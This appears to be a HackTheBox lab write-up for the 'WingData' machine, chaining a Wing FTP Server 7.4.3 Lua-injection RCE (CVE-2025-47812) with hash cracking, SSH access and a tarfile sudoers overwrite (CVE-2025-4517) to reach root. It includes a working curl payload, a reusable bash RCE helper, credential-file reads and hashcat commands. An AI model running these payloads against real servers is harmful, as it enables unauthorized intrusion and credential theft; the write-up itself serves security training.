---
title: "HTB WingData Write-up: Wing FTP RCE to Root"
date: 2026-06-22 17:00:00 +0700
categories: [Writeups, HackTheBox]
tags: [HackTheBox, Linux, Wing-FTP, CVE-2025-47812, CVE-2025-4517, RCE, hashcat, privilege-escalation]
permalink: /posts/htb-wingdata-writeup/
---

## Overview

WingData is a Linux machine that chains a vulnerable Wing FTP Server instance with weak credential storage and a vulnerable privileged backup restore script.

The high-level attack path was:

```text
Wing FTP RCE
-> read application config
-> extract Wing FTP user hashes
-> crack wacky's password
-> SSH as wacky
-> abuse sudo backup restore script
-> root
```

## Recon

The target exposed a Wing FTP Server web interface:

```text
Wing FTP Server v7.4.3
```

This version was vulnerable to an unauthenticated RCE in the web client login flow.

The interesting host was:

```text
http://ftp.wingdata.htb
```

## Foothold: CVE-2025-47812

Wing FTP Server 7.4.3 was vulnerable to a null-byte Lua injection issue in the `username` parameter of `/loginok.html`.

The exploit flow was:

1. Send a malicious `username` value to `/loginok.html`.
2. Extract the returned `UID` cookie.
3. Trigger the injected Lua code by requesting `/dir.html` with that cookie.

Example RCE payload:

```bash
curl -i -s -X POST 'http://ftp.wingdata.htb/loginok.html' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username=anonymous%00]]%0dlocal+h+%3d+io.popen("id")%0dlocal+r+%3d+h%3aread("*a")%0dh%3aclose()%0dprint(r)%0d--&password='
```

After getting the `UID` cookie:

```bash
curl -i -s 'http://ftp.wingdata.htb/dir.html' \
  -H 'Cookie: UID=<UID>'
```

This confirmed command execution as:

```text
uid=1000(wingftp) gid=1000(wingftp)
```

## RCE Helper

To make enumeration easier, I used a small helper script that sends the payload, extracts the cookie, triggers `/dir.html`, and logs out to avoid session-limit issues.

```bash
#!/usr/bin/env bash
set -euo pipefail

TARGET='http://ftp.wingdata.htb'
CMD="${1:-id}"

USERNAME_VALUE=$(python3 - "$CMD" <<'PY'
import sys
import urllib.parse

cmd = sys.argv[1]

value = (
    'anonymous\x00]]\r'
    'local h = io.popen(' + repr(cmd) + ')\r'
    'local r = h:read("*a")\r'
    'h:close()\r'
    'print(r)\r'
    '--'
)

print(urllib.parse.quote_from_bytes(value.encode()))
PY
)

RESP=$(curl -i -s -X POST "$TARGET/loginok.html" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary "username=$USERNAME_VALUE&password=")

WING_UID=$(echo "$RESP" | grep -io 'UID=[^;]*' | head -n1 | cut -d= -f2)

if [ -z "${WING_UID:-}" ]; then
  echo "[-] No UID cookie found" >&2
  echo "$RESP" | grep -iE 'HTTP/|Set-Cookie|Login failed|too many|Content-Length' >&2 || true
  exit 1
fi

OUT=$(curl -s "$TARGET/dir.html" -H "Cookie: UID=$WING_UID")
curl -s "$TARGET/logout.html" -H "Cookie: UID=$WING_UID" >/dev/null || true

printf '%s\n' "$OUT" | sed '/^<?xml version=/,$d'
```

Usage:

```bash
./wing_rce.sh 'id'
./wing_rce.sh 'pwd'
./wing_rce.sh 'ls -al'
```

The Wing FTP installation directory was:

```text
/opt/wftpserver
```

## Credential Extraction

The application data directory contained XML files for Wing FTP users:

```bash
./wing_rce.sh 'find /opt/wftpserver/Data -maxdepth 4 -type f -printf "%p\n" 2>/dev/null'
```

Interesting files:

```text
/opt/wftpserver/Data/1/users/anonymous.xml
/opt/wftpserver/Data/1/users/john.xml
/opt/wftpserver/Data/1/users/maria.xml
/opt/wftpserver/Data/1/users/steve.xml
/opt/wftpserver/Data/1/users/wacky.xml
/opt/wftpserver/Data/_ADMINISTRATOR/admins.xml
```

Each user XML contained a password hash:

```bash
./wing_rce.sh 'grep -RniE "UserName|Password" /opt/wftpserver/Data/1/users /opt/wftpserver/Data/_ADMINISTRATOR 2>/dev/null'
```

The useful target was `wacky`, because `/etc/passwd` showed that `wacky` was also a real Linux user with a shell:

```bash
./wing_rce.sh 'cat /etc/passwd | grep -E "wacky|bash|sh$"; ls -la /home'
```

Output showed:

```text
wacky:x:1001:1001::/home/wacky:/bin/bash
```

## Hash Cracking

At first, treating the hash as raw SHA-256 did not work:

```bash
hashcat -m 1400 -a 0 wacky.hash /usr/share/wordlists/rockyou.txt --username
```

The correct format was salted SHA-256:

```text
sha256(password + "WingFTP")
```

So the Hashcat mode was `1410`.

The hash file format was:

```text
<hash>:WingFTP
```

Example:

```bash
cat > wacky_1410.txt <<'EOF'
<redacted_hash>:WingFTP
EOF
```

Crack it:

```bash
hashcat -m 1410 -a 0 wacky_1410.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1410 wacky_1410.txt --show
```

This recovered the password for `wacky`.

## SSH as wacky

Using the cracked credential:

```bash
ssh wacky@ftp.wingdata.htb
```

Then confirm access:

```bash
id
ls -al
```

The user flag was in:

```text
/home/wacky/user.txt
```

I am intentionally not including the flag value in this write-up.

## Privilege Escalation

Running `sudo -l` as `wacky` showed:

```text
(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

The script restored client backups from tar archives:

```python
BACKUP_BASE_DIR = "/opt/backup_clients/backups"
STAGING_BASE = "/opt/backup_clients/restored_backups"

with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")
```

Important details:

- The script runs as root through sudo.
- The backup file must be named `backup_<id>.tar`.
- The backup file must be located in `/opt/backup_clients/backups`.
- The `backups` directory is writable by group `wacky`.
- The script uses Python `tarfile.extractall(..., filter="data")`.

This made it possible to abuse CVE-2025-4517 with a crafted tar archive.

## Root: CVE-2025-4517

The vulnerable restore script extracted an attacker-controlled tar file as root.

Using a CVE-2025-4517 tarfile exploit, I created a malicious tar that wrote a sudoers entry for `wacky`.

Create/deploy the tar:

```bash
cd /tmp
python3 CVE-2025-4517-POC.py --create-only
cp /tmp/cve_2025_4517_exploit.tar /opt/backup_clients/backups/backup_9999.tar
```

Trigger the restore script:

```bash
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
  -b backup_9999.tar \
  -r restore_exploit
```

After extraction, the exploit added a sudoers rule similar to:

```text
wacky ALL=(ALL) NOPASSWD: ALL
```

Then root was obtained with:

```bash
sudo /bin/bash
```

Confirm:

```bash
id
```

The root flag was in:

```text
/root/root.txt
```
